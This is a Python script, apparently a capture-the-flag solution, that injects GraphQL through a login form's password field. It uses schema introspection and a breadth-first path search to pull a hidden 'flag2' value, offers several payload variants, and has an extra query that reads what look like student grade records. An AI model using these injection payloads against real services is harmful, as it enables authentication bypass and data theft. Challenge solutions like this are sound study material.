from ast import literal_eval
from html import unescape
from http.cookies import SimpleCookie
import os
import re
import requests
import secrets

URL = os.environ.get('URL', 'http://localhost:5000')
COOKIE = os.environ.get('COOKIE', '')

cookie = SimpleCookie()
cookie.load(COOKIE)
session = requests.Session()
session.cookies.update({k: v.value for k, v in cookie.items()})


def register(username, password):
    res = session.post(
        f'{URL}/register',
        data={'username': username, 'password': password}
    )
    res.raise_for_status()


def login(username, password):
    print(f'{username = }')
    print(f'{password = }')
    res = session.post(
        f'{URL}/login',
        data={'username': username, 'password': password}
    )
    res.raise_for_status()
    return res.text


def sol1():
    username = secrets.token_hex(16)
    password = secrets.token_hex(16)
    register(username, password)

    payload = f'''{password}") {{
    login(username: $username, password: $password) {{
      ok
      isAdmin: ok
      username
    }}
    originalQuery:
    #'''

    print(login(username, payload))


def send(payload: str):
    payload = re.sub(r"\s+", ' ', payload)
    payload = re.sub(r"^ | $|(?<=\W) | (?=\W)", '', payload)
    # res = login('x', f'"){{login:{payload}x:#')
    res = login('",$password:String=""){login:#', f'\n{payload}x:#')
    username = re.search(r'用户名</strong>\s*<div>(.*?)</div>', res)
    assert username is not None
    return literal_eval(unescape(username.group(1)))


def introspection1():
    introspection = '''
    __schema {
      ok: __typename
      username: types {
        name
        fields {
          name
          type {
            name
          }
        }
      }
    }
    '''

    fields = {}

    types = send(introspection)

    for t in types:
        if t.get('fields') is None:
            continue
        fields[t['name']] = {}
        for f in t['fields']:
            fields[t['name']][f['name']] = f['type']['name']

    return fields


def introspection2():
    introspection = '''
    __type(name: "Secret") {
      ok: name
      username: fields {
        name
        type {
          name
          fields {
            name
            type {
              name
              fields {
                name
                type {
                  name
                  fields {
                    name
                    type {
                      name
                      fields {
                        name
                        type {
                          name
                          fields {
                            name
                            type {
                              name
                              fields {
                                name
                                type {
                                  name
                                  fields {
                                    name
                                    type { name }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    '''

    secret_fields = send(introspection)

    fields = {}

    def dfs(u):
        if u['name'] in fields or u.get('fields') is None:
            return
        fields[u['name']] = {}
        for f in u['fields']:
            fields[u['name']][f['name']] = f['type']['name']
            dfs(f['type'])

    dfs({'name': 'Secret', 'fields': secret_fields})

    return fields


def bfs(fields):
    path = {'Secret': '<SLOT>'}
    queue = ['Secret']

    while len(queue) > 0:
        u = queue.pop(0)
        if u not in fields:
            continue
        for f, v in fields[u].items():
            if v not in path:
                path[v] = path[u].replace('<SLOT>', f'{f}{{<SLOT>}}')
                queue.append(v)

    return path


def flag_query(fields, path):
    for u in fields:
        for f in fields[u]:
            if f == 'flag2':
                return path[u].replace('<SLOT>', f)


def get_short(fields):
    """shortest payload"""
    path = bfs(fields)
    query = flag_query(fields, path)
    res = send(f'secret {{ username: {query} ok: __typename }}')
    print(res)


def get_long(fields):
    """long payload"""
    path = bfs(fields)
    query = flag_query(fields, path)
    res = send(f'secret {{ ok: {query} isAdmin: {query} username: {query} }}')
    print(res)


def get1(fields):
    """use __typename"""
    path = bfs(fields)
    query = flag_query(fields, path)
    res = send(f'secret {{ ok: __typename isAdmin: __typename username: {query} }}')
    print(res)


def get2(fields):
    """omit isAdmin"""
    path = bfs(fields)
    query = flag_query(fields, path)
    res = send(f'secret {{ ok: {query} username: {query} }}')
    print(res)


def get3(fields):
    """use fragment"""

    path = bfs(fields)
    query = flag_query(fields, path)
    assert query is not None

    query_match = re.match(r'(\w+)\{(.*)\}', query)
    assert query_match is not None
    outer = query_match.group(1)
    inner = query_match.group(2)

    res = send(f'''secret {{
        ok: {outer} {{ ... i }}
        isAdmin: {outer} {{ ... i }}
        username: {outer} {{ ... i }}
      }}
      ... l
    }}
    fragment i on {fields["Secret"][outer]} {{
      {inner}
    }}
    fragment l on Query {{
    ''')

    print(res)


def get4(fields):
    """use shortest leaf"""

    path = bfs(fields)
    query = flag_query(fields, path)

    shortest = 'a' * 1000
    for u, p in path.items():
        if u not in fields:
            continue
        for f in fields[u]:
            if f.startswith('not_flag'):
                q = p.replace('<SLOT>', f)
                if len(q) < len(shortest):
                    shortest = q

    res = send(f'secret {{ ok: {shortest} isAdmin: {shortest} username: {query} }}')
    print(res)


def sol2():
    fields = introspection1()
    # fields = introspection2()

    get_short(fields)
    # get_long(fields)
    # get1(fields)
    # get2(fields)
    # get3(fields)
    # get4(fields)


def easter_egg():
    query = '''secret {
      ok: __typename
      username: not_part_of_challenge {
        selectOnePresetData(presetKey: "103765749452800", XH: "2025019999", KCH: "77777777") {
          XH KCH KSRQ XNXQ XF KCMC ZCJ
        }
      }
    }'''
    print(send(query))


sol1()

sol2()

easter_egg()
